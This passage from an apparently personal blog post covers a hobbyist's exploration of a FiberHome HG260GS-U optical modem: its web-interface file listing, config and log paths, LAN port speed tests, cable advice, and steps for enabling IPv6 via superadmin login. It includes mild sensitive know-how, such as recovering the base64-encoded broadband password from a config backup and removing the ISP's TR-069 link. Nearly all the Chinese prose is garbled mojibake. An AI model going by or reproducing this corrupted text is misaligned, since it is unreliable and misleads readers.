register_restore_sichuan.htmldefaultsettings.html                 register_restoreinfo.htmldhcpinfo.html                        register_sichuan.htmldiaginform.html                      registered_chongqing.htmldnscfg.html                          registered_fujian.htmldnsproxycfg.html                     registered_guangdong.htmldosprotect.html                      registered_hunan.htmldownloadFile.html                    resetrouter.htmlenableipv6.html                      restoreinfo.htmlengdebug.html                        restoresettings.htmleponadderr.html                      restrain.htmlepondelerr.html                      ripcfg.htmlethadderr.html                       routeadd.htmlethdelerr.html                       routetbl.htmlexporting.js                         rtdefaultcfg.htmlexternalapcfg.html                   rtdefaultcfgerr.htmlexternalapcfgoffline.html            rtroutecfg.htmlexternalapsecurity.html              scdmz.htmlexternalapsecurityoffline.html       scinflt.htmlfactorymode.html                     scinfltview.htmlfbctwanconfig.html                   scmacflt.htmlfhvoiceh248dsp.html                  scmacfltview.htmlfhvoiceh248mgc.html                  scmacpolicy.htmlfhvoiceh248ngn.html                  scoutflt.htmlfhvoiceh248port.html                 scoutfltview.htmlfhvoiceprotocol.html                 scvrtsrv.htmlfhvoicesettings.html                 servmngr.htmlfhvoicesipadvance.html               simcardoffline.htmlfhvoicesipbasic.html                 sipregstatus.htmlfhvoicesipdigitmap.html              sipteleview.htmlfhvoicesipfax.html                   sntpcfg.htmlfhvoicesipuserline.html              speed.htmlfirewall.html                        statsifc.htmlfooter.html                          statsifcreset.htmlftpcfg.html                          statswan.htmlgponadderr.html                      statswanreset.htmlgpondelerr.html                      storageusraccadd.htmlhelp_manage_device.html              stylemain.csshelp_manage_file.html                stylesCT.csshelp_manage_keep.html                surprise.htmlhelp_manage_user.html                todadd.htmlhelp_net_QOS.html                    todmngrview.htmlhelp_net_WLAN.html                   tr69cfg.htmlhelp_net_dhcp.html                   tr69cfgview.htmlhelp_net_externalap.html             tr69connect.htmlhelp_net_network.html                traffictl.htmlhelp_net_remote.html                 traffictladd.htmlhelp_net_route.html                  updatesettings.htmlhelp_net_time.html                   upload.htmlhelp_net_voice.html                  upload_chongqing.htmlhelp_net_voip.html                   uploadinfo.htmlhelp_safe_firewall.html              upnpcfg.htmlhelp_safe_mac.html                   url_add.htmlhelp_safe_port.html                  urlfilter.htmlhelp_safe_wan.html                   urlfilterErr.htmlhelp_status_device.html              usbbackup.htmlhelp_status_net.html                 usbbackuphandle.htmlhelp_status_remote.html              usbbackupresult.htmlhelp_status_user.html                usbinfo.htmlhelp_status_voip.html                usbxdown.htmlhelp_use_IGMP.html                   util.jshelp_use_MLD.html                    wlcfg.htmlhelp_use_UPNP.html                   wlcfg_jiangsu.htmlhelp_use_VOIP.html                   wlcfg_zhejiang.htmlhelp_use_device.html                 wlcfg_zhejiang_user.htmlhelp_use_dns.html                    wlcfgadv.htmlhelp_use_nat.html                    wlrefresh.htmlhelp_use_usual.html                  wlsecurity.htmlhighcharts.js                        wlsecurity_jiangsu.htmlhlpethconn.html                      wlsecurity_zhejiang.htmlhlpwlconn.html                       wlsecurity_zhejiang_user.htmlindex.html                           wlshared.htmlipsconfig.html                       wlwapias.html</code></pre><p>ç„¶åè¿˜å¯ä»¥å‘ç°ä¹‹å‰çš„é…ç½®æ–‡ä»¶åœ¨ <code>/fhconf/backpresettings.conf</code>ã€‚</p><p>æ—¥å¿—æ–‡ä»¶åœ¨<code>/fhlog/messages</code> ã€‚</p><p><code>/rom/etc/wlan</code> ç›®å½•ä¸‹å¥½åƒæœ‰ä¸€äº›ç½‘å¡èŠ¯ç‰‡çš„é©±åŠ¨ï¼ˆï¼Ÿ</p><p><img src="/2020/02/27/Server_OpticalModem/rombin.png" alt="rom"></p><p>ç„¶ååœ¨æŸä¸ªç›®å½•ä¸‹æ‰¾åˆ°äº†å„ç§é»˜è®¤é…ç½®æ–‡ä»¶emmm</p><p><img src="/2020/02/27/Server_OpticalModem/default_settings.png" alt="default_settings"></p><p>å…¶ä»–çš„åé¢å†æ…¢æ…¢ç©å§ï¼ˆ</p><p>è¿˜æœ‰æé†’ä¸€ä¸‹ï¼Œ<strong>telnet ä¸ç”¨çš„è¯æœ€å¥½è¿˜æ˜¯å…³æ‰</strong>å§ï¼Œé˜²æ­¢åˆ«äººè¿ä¸Šå…‰çŒ«æ”¹äº†ä½ çš„é…ç½®å°±ä¸å¥½äº†å‘¢ã€‚</p><br><hr><h2 id="0x03-å†çœ‹å…‰çŒ«å‚æ•°-amp-æµ‹é€Ÿ"><a href="#0x03-å†çœ‹å…‰çŒ«å‚æ•°-amp-æµ‹é€Ÿ" class="headerlink" title="0x03 å†çœ‹å…‰çŒ«å‚æ•° &amp; æµ‹é€Ÿ"></a>0x03 å†çœ‹å…‰çŒ«å‚æ•° &amp; æµ‹é€Ÿ</h2><h3 id="å…‰çŒ«å‚æ•°"><a href="#å…‰çŒ«å‚æ•°" class="headerlink" title="å…‰çŒ«å‚æ•°"></a>å…‰çŒ«å‚æ•°</h3><p>ä¸Šç½‘æœäº†ä¸€ä¸‹è¿™ä¸ªå…‰çŒ«çš„å‚æ•°ã€‚ï¼ˆå¯èƒ½æœ‰æ‰€åŒºåˆ«ï¼‰</p><blockquote><p>çƒ½ç«HG260GS-U</p><p>äº§å“ç‰¹ç‚¹   </p><ul><li>æ”¯æŒGPONæ¥å£ï¼Œ4FE+2POTSï¼ŒLAN1å£=1G LAN 2.3.4å£=100M  </li><li>æ”¯æŒè·¯ç”±/æ¡¥æ··åˆè½¬å‘ã€‚  </li><li>æ”¯æŒVLANè¿æ¥ã€‚   </li><li>æä¾›2.4GHz 802.11b/g/næ— çº¿æ¥å…¥åŠŸèƒ½ï¼Œæœ€é«˜é€Ÿç‡å¯è¾¾270Mbpsï¼Œè¦†ç›–èŒƒå›´30m~100mã€‚   </li><li>æ”¯æŒSIP/MGCP/H.248ç­‰VOIPåè®®è¯­éŸ³ï¼Œæ”¯æŒå¤šç§è¯­éŸ³ç¼–ç å™¨ã€‚   </li><li>å¼ºå¤§çš„QoSèƒ½åŠ›ï¼Œä¿éšœå¤šä¸šåŠ¡ç¯å¢ƒä¸‹çš„VoIPã€IPTVç­‰å…³é”®ä¸šåŠ¡çš„æœåŠ¡è´¨é‡ã€‚   </li><li>æ”¯æŒTR-069è¿œç¨‹ç®¡ç†ï¼šè®¾å¤‡é…ç½®ã€ç‰ˆæœ¬å‡çº§ã€è¯Šæ–­ç­‰ã€‚   </li><li>æ”¯æŒWPSã€‚   </li><li>æ”¯æŒWebæ–¹å¼ï¼Œç”¨æˆ·æœ¬åœ°ç®¡ç†åŠŸèƒ½ã€‚   </li><li>æ”¯æŒå¤šSSIDï¼Œæä¾›å¤šä¸ªè™šæ‹Ÿæ— çº¿ç½‘ç»œã€‚   </li><li>æ”¯æŒVPNç©¿è¶Š ï¼ŒåŸºäºIPSec/L2TPã€‚   </li><li>æ”¯æŒIPv4/v6,TCP/UDPåè®®ï¼Œæ”¯æŒIPv6å¼€å¯DS-liteå’ŒåŒæ ˆåŠŸèƒ½ã€‚   </li><li>èŠ¯ç‰‡é›†æˆåº¦é«˜ï¼ŒåŠŸè€—å°ï¼Œæ€§èƒ½ç¨³å®šã€‚   </li></ul></blockquote><p>å“‡å‘œï¼Œå®ƒæ˜¯<strong>æ”¯æŒåƒå…†</strong>çš„å•Šï¼</p><p>ä¸è¿‡<strong>åªæœ‰1å£æ”¯æŒ1Gbpsï¼Œå…¶ä»–éƒ½æ˜¯100Mbpsçš„</strong>emmm </p><p>äºæ˜¯ç›´æ¥ç”¨ç½‘çº¿è¿æ¥å…‰çŒ«æµ‹äº†ä¸€ä¸‹ï¼Œæœç„¶æ˜¯è¿™æ ·ã€‚</p><p>ä¹‹å‰éƒ½æ²¡æ³¨æ„è¿™ä¸ªé—®é¢˜å”‰ï¼æ˜¯ä¸æ˜¯å› ä¸ºè¿™ä¸ªé—®é¢˜å½±å“äº†ç½‘é€Ÿå•Šå•Šå•Šå•Šå˜¤å˜¤å˜¤ã€‚<em>ï¼ˆå…¶å®æˆ‘ä¹Ÿä¸çŸ¥é“æˆ‘å®¶å®½å¸¦æœ‰å¤šå°‘å¸¦å®½ï¼‰</em></p><p>æ¥æµ‹ä¸ªé€Ÿçœ‹çœ‹å¥½äº†ã€‚</p><h3 id="æµ‹é€Ÿ"><a href="#æµ‹é€Ÿ" class="headerlink" title="æµ‹é€Ÿ"></a>æµ‹é€Ÿ</h3><p>è¿™æ˜¯ <strong>è¿æ¥ WiFi</strong> çš„æµ‹é€Ÿç»“æœâ†“ã€‚</p><p><img src="/2020/02/27/Server_OpticalModem/speedtest1.png" alt="WiFiæµ‹é€Ÿ"></p><p>é€šè¿‡<strong>ç½‘çº¿ç›´è¿åˆ°é™¤1å£å¤–çš„ä»»æ„ä¸€ä¸ª LAN å£</strong>ï¼Œå†æ¬¡æµ‹é€Ÿã€‚</p><p><img src="/2020/02/27/Server_OpticalModem/speedtest2.png" alt="LAN2-4æµ‹é€Ÿ"></p><p>å·®ä¸å¤šè·‘æ»¡100Mbpsçš„å¸¦å®½äº†ã€‚</p><p>é‚£å†æ¥çœ‹çœ‹ <strong>LAN1 çš„åƒå…†å£</strong>å§ã€‚</p><p><img src="/2020/02/27/Server_OpticalModem/speedtest3.png" alt="LAN1æµ‹é€Ÿ"></p><p>ï¼Ÿï¼Ÿï¼Ÿ</p><p>ä½ åœ¨é€—æˆ‘å˜›ï¼Ÿï¼å“‡å‘œåŸæ¥æœ‰å·®ä¸å¤š150Mbpsçš„å•Šï¼</p><p>åŸæ¥<strong>å—é™äº LAN å£çš„å¸¦å®½</strong>å•Šï¼</p><p>æ°”æ­»æˆ‘äº†ï¼Œè¿æ¥WiFiçš„è¯åªæœ‰å·®ä¸å¤š1/3çš„é€Ÿåº¦å•Šï¼Œè‰ï¼ˆä¸€ç§æ¤ç‰©ï¼‰ã€‚</p><p>ç„¶åæŠŠä¹‹å‰è¿åœ¨å…‰çŒ«åçš„æ— çº¿è·¯ç”±å™¨æ¥åˆ°äº† LAN1 å£ï¼Œå†ç™»ä¸Šè·¯ç”±å™¨ä¸€çœ‹ï¼ŒåŸæ¥å®ƒä¹Ÿåªæ”¯æŒç™¾å…†å¸¦å®½emmm</p><p><img src="/2020/02/27/Server_OpticalModem/router.png" alt="router"></p><p>ä¸è¿‡æ€ä¹ˆè¯´å¥½å‘¢ï¼Œæ¯•ç«Ÿè¿™å…‰çŒ«å’Œè·¯ç”±å™¨éƒ½æœ‰äº›å¹´çºªäº†ï¼Œé‚£æ—¶å€™åƒå…†è¿˜æ²¡æ™®åŠå‘¢ï¼Œå¯èƒ½ç”¨çš„æ‰æ˜¯10M/50Mæœ€å¤šä¹Ÿä¸è¶…è¿‡100Mçš„å®½å¸¦å‘¢ã€‚</p><p>æ‰€ä»¥å…‰çŒ«æœ‰ä¸€ä¸ªåƒå…†å£ä¹Ÿå¾ˆä¸é”™äº†å‘¢233333.ï¼ˆæ‘Šæ‰‹.gif</p><h3 id="ç½‘çº¿çš„è®²ç©¶"><a href="#ç½‘çº¿çš„è®²ç©¶" class="headerlink" title="ç½‘çº¿çš„è®²ç©¶"></a>ç½‘çº¿çš„è®²ç©¶</h3><p>å™¢å¯¹äº†ï¼Œè¿˜æœ‰ä¸€ä¸ªå¥½ç©çš„äº‹ã€‚ã€‚ã€‚</p><p>è¦ç”¨ä¸Šåƒå…†ä»¥å¤ªç½‘ï¼Œä¸ä»…éœ€è¦<strong>å…‰çŒ«ã€è·¯ç”±å™¨æ”¯æŒ</strong>ï¼Œè¿˜è¦ä½ è‡ªå·±çš„<strong>è®¾å¤‡æ”¯æŒ</strong>ï¼Œå¦‚æœæœ‰çº¿è¿æ¥çš„è¯ç½‘çº¿è¿˜è‡³å°‘è¦<strong>è¶…äº”ç±»çº¿</strong>ã€‚</p><p>ä½†æ˜¯è¿˜è¦æ³¨æ„<strong>è·ç¦»é™åˆ¶</strong>ï¼Œè¶…è¿‡ä¸€å®šçš„è·ç¦»ï¼ˆå¦‚100mï¼‰ä¹Ÿä¸è¡Œäº†ï¼Œç±»åˆ«è¶Šé«˜ä¼ è¾“çš„é¢‘ç‡è¶Šé«˜åˆ™å…è®¸çš„è·ç¦»å°±è¶Šå°ã€‚ï¼ˆå•Šå¤§ä½¬ä½ ç”¨å…‰çº¤ï¼Ÿæ‰“æ‰°äº†ã€‚</p><p>æˆ‘ç”¨ç½‘çº¿è¿æ¥çš„æ—¶å€™ï¼Œæœ€å¼€å§‹ç”¨çš„æ˜¯ä¸€æ ¹æ¯”è¾ƒè€çš„ CAT-5eï¼ˆè¶…äº”ç±»ï¼‰çº¿ï¼Œå¯èƒ½æ˜¯ç«¯å£æ¥è§¦ä¸å¤§å¥½æˆ–è€…çº¿è·¯è€åŒ–çš„åŸå› å§ï¼Œå®é™…ç½‘å¡åªåå•†åˆ°äº†100Mbpsã€‚æ¢äº†ä¸€æ ¹æ–°çš„ç½‘çº¿ï¼ˆå¥½åƒä¹Ÿæ˜¯CAT-5eï¼‰å°±æœ‰1Gbpsäº†ã€‚</p><p>ç„¶è€Œï¼Œè¿™æ ¹ç½‘çº¿ä¸å¤Ÿé•¿ï¼Œæˆ‘ç”¨è¿æ¥å™¨æŠŠä¸¤æ ¹éƒ½èƒ½é€šåƒå…†çš„ç½‘çº¿è¿ä¸€èµ·å†è¿åˆ°ç”µè„‘ï¼Œè¿™æ—¶ç½‘å£åˆåå•†åˆ°100Mbpsäº†emmm</p><p>çœ‹æ¥è¿™ä¸ªç½‘çº¿æŠ—å¹²æ‰°èƒ½åŠ›ä¸å¤§è¡Œå‘€ï¼Œåƒå…†ç½‘çš„æœ‰çº¿ä¼ è¾“è¦æ±‚è¿˜æ˜¯æŒºä¸¥æ ¼çš„ã€‚</p><p>ä¸è¿‡ç°åœ¨ç”¨çš„åŸºæœ¬å°±<strong>å…­ç±»çº¿ä»¥ä¸Š</strong>äº†å§ï¼Œä¹°ç½‘çº¿è¿˜æœ‰è£…ä¿®å¸ƒçº¿ä»€ä¹ˆçš„æ—¶å€™è¦æ³¨æ„ä¸€ä¸‹è¿™ä¸ªé—®é¢˜ã€‚</p><p>è¿˜æœ‰ä¹°ç½‘çº¿<strong>ä¸è¦ä¹°æ‰çš„é‚£ç§</strong>ï¼Œå‰–é¢åœ†å½¢é‚£ç§å°±å¥½ã€‚ï¼ˆæ„Ÿè§‰ç®—æ˜¯<strong>ä¼ è¾“çº¿ç†è®º</strong>ï¼Ÿ</p><br><hr><h2 id="0x04-å¯ç”¨-IPv6"><a href="#0x04-å¯ç”¨-IPv6" class="headerlink" title="0x04 å¯ç”¨ IPv6"></a>0x04 å¯ç”¨ IPv6</h2><p>å‰é¢çœ‹å…‰çŒ«çš„å‚æ•°ï¼Œå‘ç°æ”¯æŒ IPv6 å”‰ï¼</p><p>å¬è¯´ä¸‰å¤§è¿è¥å•†çš„å®½å¸¦åŸºæœ¬éƒ¨ç½² IPv6 äº†ï¼Œä¸è¿‡ä¼°è®¡è®¾ç½®é‡Œæ²¡å¼€å¯ï¼Œæœ¬åœ°ä¹Ÿæ²¡æœ‰åˆ†é…å…¬ç½‘åœ°å€ï¼Œè¿™æ¬¡å°±æ¥æŠ˜è…¾ä¸€ä¸‹å§ã€‚</p><blockquote><p>å…ˆè¯´ä¸€ä¸‹ï¼Œæˆ‘è‡ªå·±å¯¹IPv6è¿™ä¸€å—éƒ½ä¸å¤§äº†è§£ï¼Œè¿™ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡å°è¯•è®¾ç½®è¿™ä¸ªã€‚</p><p>åŒ…æ‹¬å‰ç¼€åˆ†é…ä»€ä¹ˆçš„æˆ‘éƒ½ä¸æ¸…æ¥šï¼Œæ‰€ä»¥è¿™é‡Œçš„è¯´æ³•æœ‰å¯èƒ½å­˜åœ¨é”™è¯¯ï¼Œ<strong>å¤§ä½¬ä»¬çœ‹åˆ°çš„è¯æ¬¢è¿å’Œæˆ‘äº¤æµå‘€ï¼</strong></p></blockquote><h3 id="Step-1-ä»¥è¶…çº§ç®¡ç†å‘˜èº«ä»½ç™»å½•å…‰çŒ«"><a href="#Step-1-ä»¥è¶…çº§ç®¡ç†å‘˜èº«ä»½ç™»å½•å…‰çŒ«" class="headerlink" title="Step 1 ä»¥è¶…çº§ç®¡ç†å‘˜èº«ä»½ç™»å½•å…‰çŒ«"></a>Step 1 ä»¥è¶…çº§ç®¡ç†å‘˜èº«ä»½ç™»å½•å…‰çŒ«</h3><p>ç”¨ä¸Šé¢è·å–çš„ç”¨æˆ·åå¯†ç ç™»å½•ã€‚</p><p>åœ¨è®¾ç½®å‰ï¼ŒæŸ¥çœ‹<strong>çŠ¶æ€-ç½‘ç»œä¾§ä¿¡æ¯-IPv6 è¿æ¥ä¿¡æ¯</strong>ï¼Œåº”è¯¥æ˜¯ç©ºçš„ã€‚è€Œ <strong>IPv4 è¿æ¥ä¿¡æ¯</strong>é‡Œæœ‰ä¸€ä¸ªè¿æ¥çš„æè¿°é‡Œæ˜¯å¸¦æœ‰<code>INTERNET</code>çš„ã€‚</p><p>ï¼ˆå‡è£…è¿™é‡Œæœ‰æˆªå›¾ï¼‰</p><h3 id="Step-2-è·å–å½“å‰è®¾ç½®çš„å‚æ•°"><a href="#Step-2-è·å–å½“å‰è®¾ç½®çš„å‚æ•°" class="headerlink" title="Step 2 è·å–å½“å‰è®¾ç½®çš„å‚æ•°"></a>Step 2 è·å–å½“å‰è®¾ç½®çš„å‚æ•°</h3><p>é¦–å…ˆåœ¨<strong>è¿æ¥åç§°</strong>é‡Œé€‰æ‹©å¸¦æœ‰<code>INTERNET</code>çš„é€‰é¡¹ï¼Œç„¶å<strong>æŠŠè¿™ä¸€é¡µæˆªä¸ªå›¾æˆ–è€…æ‹ç…§å¤‡ä»½ä¸€ä¸‹</strong>ã€‚ï¼ˆé‡è¦ï¼‰</p><p>æœ€å¥½ä¹Ÿå¤‡ä»½ä¸€ä¸‹è®¾ç½®æ–‡ä»¶ï¼ˆåŒ 0x01ï¼‰ï¼</p><p>è¿™é‡Œé¢çš„VLAN IDã€MTUæ˜¯åé¢çš„ä¾æ®ã€‚</p><h3 id="Step-3-æ–°å»ºå®½å¸¦è¿æ¥"><a href="#Step-3-æ–°å»ºå®½å¸¦è¿æ¥" class="headerlink" title="Step 3 æ–°å»ºå®½å¸¦è¿æ¥"></a>Step 3 æ–°å»ºå®½å¸¦è¿æ¥</h3><p>è¿™é‡Œå‰ææ˜¯<strong>çŸ¥é“å®½å¸¦çš„å¯†ç </strong>ï¼Œå¦‚æœä¸çŸ¥é“çš„è¯ï¼Œå¯ä»¥åœ¨ <strong>0x01</strong> ä¸­è·å–åˆ°çš„å¤‡ä»½æ–‡ä»¶é‡Œæ‰¾åˆ°å˜¿å˜¿å˜¿ï¼ˆä»…åšäº†base64åŠ å¯†ï¼‰ã€‚</p><p>æ–°å»ºä¸€ä¸ªWANè¿æ¥ï¼Œ<strong>æ¨¡å¼é€‰æ‹©<code>Route</code>ï¼ˆè·¯ç”±ï¼‰ï¼Œåè®®æ¨¡å¼é€‰æ‹©<code>IPv4 &amp; IPv6</code>ï¼ˆè¿™å°±æ˜¯ç›®çš„æ‰€åœ¨å–µï¼ï¼‰ã€‚</strong></p><p>é€‰<code>PPPoE</code>ï¼ŒMTUé‡Œå¡«ä¸Šä¸€æ­¥éª¤çš„å‚æ•°ï¼›å‹¾é€‰<strong>å¯ç”¨Vlan</strong>ï¼Œ<strong>Vlan IDå¡«ä¸Šä¸€æ­¥å‚æ•°</strong>ã€‚</p><p><strong>IPv6åœ°å€åˆ†é…æœºåˆ¶</strong>çš„è¯ï¼Œæˆ‘è¿™é‡Œ<strong>è‡ªåŠ¨è·å–</strong>å’Œ<strong>DHCPv6</strong>éƒ½è¡Œï¼Œä¸è¿‡å»ºè®®é€‰è‡ªåŠ¨è·å–å§ã€‚ã€‚ã€‚<em>ï¼ˆä¸å¤§æ¸…æ¥š</em></p><p>è·å–å‰ç¼€å‹¾ä¸Šå§ï¼Œå¥½åƒå¯ä»¥é è¿™ä¸ªä¸‹å‘IPv6.<em>ï¼ˆï¼Ÿ</em></p><p>æœåŠ¡æ¨¡å¼é€‰æ‹©<code>INTERNET</code>ã€‚</p><p>ç»‘å®šç«¯å£å°±æ˜¯ä½ æƒ³è¦é€šè¿‡è¿™ä¸ªWANè¿›è¡Œè¿æ¥ç½‘ç»œçš„ç«¯å£ï¼Œå¦‚æœä¸æ¸…æ¥šçš„è¯å…¨å‹¾ä¸Šå°±è¡Œäº†ã€‚å¦‚æœæœ‰IPTVçš„è¯æ³¨æ„ä¸è¦å‹¾å¯¹åº”çš„ç«¯å£ã€‚å½“ç„¶æœ‰å…¶ä»–éœ€æ±‚çš„è‡ªå·±å†è€ƒè™‘ã€‚å®ƒè¿™é‡Œæ³¨æ˜äº†çš„ã€‚</p><blockquote><p>æ³¨: WANè¿æ¥ä¹‹é—´ä¸èƒ½å…±äº«ç»‘å®šç«¯å£ï¼Œæœ€åç»‘å®šç«¯å£çš„WANè¿æ¥ç»‘å®šæ“ä½œå°†å†²æ‰ä¹‹å‰å…¶å®ƒWANè¿æ¥å¯¹è¯¥ç«¯å£çš„ç»‘å®šæ“ä½œï¼</p></blockquote><p>å¤§æ¦‚çš„ç•Œé¢ç±»ä¼¼äºè¿™æ ·çš„ã€‚ä¸åŒè®¾å¤‡å¤§åŒå°å¼‚çš„å•¦ã€‚</p><p><img src="/2020/02/27/Server_OpticalModem/IPv6_Config.png" alt="IPv6_Config"></p><p>è€Œåç‚¹å‡»<strong>ä¿å­˜/åº”ç”¨</strong>ã€‚</p><h3 id="Step-4-IPv6-DHCP-é…ç½®"><a href="#Step-4-IPv6-DHCP-é…ç½®" class="headerlink" title="Step 4 IPv6 DHCP é…ç½®"></a>Step 4 IPv6 DHCP é…ç½®</h3><p><em>ï¼ˆè¿™ä¸€å—å…¶å®æˆ‘ä¹Ÿä¸å¤§æ¸…æ¥šemmm</em></p><p>å¤§æ¦‚æ˜¯è¿™æ ·å§</p><p><img src="/2020/02/27/Server_OpticalModem/IPv6_DHCPConfig.png" alt="IPv6_DHCPConfig"></p><p>è²Œä¼¼DHCPv6æ˜¯ç§ç½‘ï¼ŒRadvdæ˜¯åˆ©ç”¨è·å–çš„å‰ç¼€ä¸‹å‘å…¬ç½‘çš„åœ°å€ã€‚</p><p>ç½‘ä¸Šå¤§æ¦‚è¿™ä¹ˆè¯´çš„â†“ã€‚</p><blockquote><p>åœ¨IPV6çš„è‡ªåŠ¨é…ç½®ä¸­ï¼Œåˆ†ä¸ºä¸¤ç§æŠ€æœ¯<br>ä¸€ç§æ˜¯ä¼ ç»Ÿçš„æœ‰çŠ¶æ€(stateful),å…¸å‹ä»£è¡¨å°±æ˜¯ä¸IPv4æ—¶ä»£ç›¸å¯¹åº”çš„DHCPv6ï¼Œ<br>ä¸€ç§æ˜¯IPv6çš„æ— çŠ¶æ€(stateless)è‡ªåŠ¨é…ç½®ï¼Œå…¸å‹ä»£è¡¨æ˜¯Radvdã€‚è¿™æ˜¯IPv6åè®®çš„ä¸€ä¸ªçªå‡ºç‰¹ç‚¹:æ”¯æŒç½‘ç»œèŠ‚ç‚¹çš„åœ°å€è‡ªåŠ¨é…ç½®ã€‚    </p><p>åœ¨æ— çŠ¶æ€åœ°å€è‡ªåŠ¨é…ç½®æ–¹å¼ä¸‹ï¼Œç½‘ç»œæ¥å£æ¥æ”¶è·¯ç”±å™¨å®£å‘Šçš„å…¨å±€åœ°å€å‰ç¼€ï¼Œå†ç»“åˆæ¥å£IDå¾—åˆ°ä¸€ä¸ªå¯èšé›†å…¨å±€å•æ’­åœ°å€ã€‚åœ¨æœ‰çŠ¶æ€åœ°å€è‡ªåŠ¨é…ç½®çš„æ–¹å¼ä¸‹ï¼Œä¸»è¦é‡‡ç”¨åŠ¨æ€ä¸»æœºé…ç½®åè®®ï¼ˆDHCPï¼‰ï¼Œéœ€è¦é…å¤‡ä¸“é—¨çš„DHCPæœåŠ¡å™¨ï¼Œç½‘ç»œæ¥å£é€šè¿‡å®¢æˆ·æœº/æœåŠ¡å™¨æ¨¡å¼ä»DHCPæœåŠ¡å™¨å¤„å¾—åˆ°åœ°å€é…ç½®ä¿¡æ¯ã€‚  </p><p>å…·ä½“æ¥è¯´ï¼Œä»¥RADVDä¸ºä»£è¡¨çš„æ— çŠ¶æ€è‡ªåŠ¨é…ç½®ä¸éœ€è¦æ¶ˆè€—å¾ˆå¤šæœºå™¨èµ„æºï¼Œä¹Ÿä¸åƒä¼ ç»ŸDHCPä¸€æ ·éœ€è¦ç»´æŠ¤ä¸€ä¸ªæœ¬åœ°æ•°æ®åº“æ¥ç»´æŠ¤åœ°å€åˆ†é…çŠ¶æ€ï¼Œä»–åªæ˜¯è¿›è¡Œå¹¿æ’­å‰ç¼€åœ°å€ï¼Œå®¢æˆ·ç«¯æ”¶åˆ°è¿™ç§å¹¿æ’­åå†è‡ªå·±ä½¿ç”¨EUI64ç®—æ³•ç”Ÿæˆå…¨çƒå”¯ä¸€çš„IPv6åœ°å€ï¼Œè¿›è¡Œè‡ªæˆ‘é…ç½®ã€‚   </p></blockquote><p>è¿˜æœ‰</p><blockquote><p>&lt;1&gt;radvdç”¨äºæ— çŠ¶æ€è‡ªåŠ¨é…ç½®åœ°å€ï¼Œå®¢æˆ·ç«¯é€šè¿‡ç½‘ç»œæ¥å£æ¥æ”¶è·¯ç”±å™¨å®£å‘Šçš„å…¨å±€åœ°å€å‰ç¼€ï¼Œå†ç»“åˆæ¥å£IDå½¢æˆå…¨çƒå•æ’­åœ°å€ï¼Œä½†æ˜¯è¿™ç§é…ç½®ä¸èƒ½è·å–DNSã€‚</p><p>&lt;2&gt;dhcpv6ç”¨äºæœ‰çŠ¶æ€è‡ªåŠ¨é…ç½®åœ°å€ï¼Œç±»ä¼¼äºipv4çš„dhcpï¼Œå®¢æˆ·ç«¯ä»æœåŠ¡å™¨çš„åœ°å€æ± ä¸­é…ç½®åœ°å€ï¼Œå¯è·å–åˆ°DNSã€‚</p></blockquote><p>ï¼ˆç„¶ååº”è¯¥è¿˜è¦é…ç½®ä¸€ä¸‹ <strong>IPv6 DNS Proxy</strong>ï¼Œ<em>è¿™ä¸ªæˆ‘ä¹Ÿä¸å¤§æ¸…æ¥šemmm</em></p><h3 id="Step-5-ç¡®è®¤è¿æ¥çŠ¶æ€"><a href="#Step-5-ç¡®è®¤è¿æ¥çŠ¶æ€" class="headerlink" title="Step 5 ç¡®è®¤è¿æ¥çŠ¶æ€"></a>Step 5 ç¡®è®¤è¿æ¥çŠ¶æ€</h3><p>è¿”å›åˆ°<strong>çŠ¶æ€-ç½‘ç»œä¾§ä¿¡æ¯</strong>ï¼Œåˆ†åˆ«çœ‹çœ‹IPv4å’Œv6çš„è¿æ¥ä¿¡æ¯ã€‚ç•™æ„åè®®ä¸­å¸¦æœ‰IPv4&amp;IPv6çš„çŠ¶æ€ã€‚</p><p>åˆšå¼€å§‹å¯èƒ½è¿ä¸ä¸Šï¼Œè¿‡ä¸€æ®µæ—¶é—´å°±è¿ä¸Šäº†ã€‚</p><p>å¦‚æœè¿˜è¿ä¸ä¸Šçš„è¯ï¼Œå°†ä¹‹å‰å¸¦æœ‰ <code>INTERNET</code> çš„é‚£ä¸ªWANè¿æ¥ç»™ç¦ç”¨æˆ–åˆ é™¤å°±å¥½äº†ã€‚</p><p>ï¼ˆä¸è¿‡å¦‚æœæœ‰ä¸ªTR069é‚£ä¸ªè¿è¥å•†é…ç½®ä¸‹å‘çš„å°±è‡ªå·±çœ‹ç€åŠäº†ï¼Œåˆ äº†å¯ä»¥ä¸å—è¿è¥å•†è¿›è¡Œé…ç½®ä¸‹å‘å’Œä¸ŠæŠ¥ï¼Œæœ‰å½±å“çš„è¯æ–°å»ºä¸€ä¸ªæˆ–è€…ä¿®æ”¹ä¸Šä¸€æ­¥çš„æœåŠ¡æ¨¡å¼å°±å¥½äº†ã€‚</p><p>åˆ°è¿™é‡Œæˆ‘æƒŠå–œåœ°å‘ç°ï¼Œè²Œä¼¼<strong>è´¦å·æ”¯æŒå¤šæ’­</strong>å”‰ï¼ä¸è¿‡è¿™ä¸ªå…‰çŒ«é‡Œè‡ªç„¶ä¸æ”¯æŒ<strong>å¤šæ’­å åŠ </strong>çš„äº†ã€‚å¯ä»¥ä½¿ç”¨æ¡¥æ¥å®½å¸¦è®©åé¢çš„è·¯ç”±å™¨åšå¤„ç†å•¦ã€‚ï¼ˆåé¢å†è¯´ï¼‰</p><p>äºæ˜¯å°è¯•äº†ä¸€ä¸‹æˆåŠŸè¿äº†ä¸¤ä¸ªï¼Œå…¶ä¸­ç»‘å®šç«¯å£è®¾ç½®æˆä¸ä¸€æ ·çš„ã€‚ä¸è¿‡ä¸çŸ¥é“æœ€å¤šå¯ä»¥å‡ æ’­hhhã€‚</p><p><img src="/2020/02/27/Server_OpticalModem/IPv4_ConnectInfo.png" alt="IPv4_ConnectInfo"></p><p><img src="/2020/02/27/Server_OpticalModem/IPv6_ConnectInfo.png" alt="IPv6_ConnectInfo"></p><p>è¿æ¥å…‰çŒ«æ˜¯å¯ä»¥ä¸‹å‘ IPv6 å…¬ç½‘åœ°å€çš„ã€‚</p><p><img src="/2020/02/27/Server_OpticalModem/IPv6_ConnectInfo2.png" alt="IPv6_ConnectInfo2"></p><p>ç„¶åå‘ç°é‚£ä¸ªå¤–æ¥çš„æ— çº¿è·¯ç”±å™¨ä¹Ÿä¸æ”¯æŒ IPv6ï¼Œæ°”æ­»äº†<em>ï¼ˆåé¢æ¢ä¸€ä¸ª</em></p><p>ä¸è¿‡ä¹Ÿæœ‰<strong>è§£å†³æ–¹æ¡ˆ</strong>çš„ï¼Œå°±æ˜¯æŠŠç½‘çº¿è¿æ¥åˆ°æ— 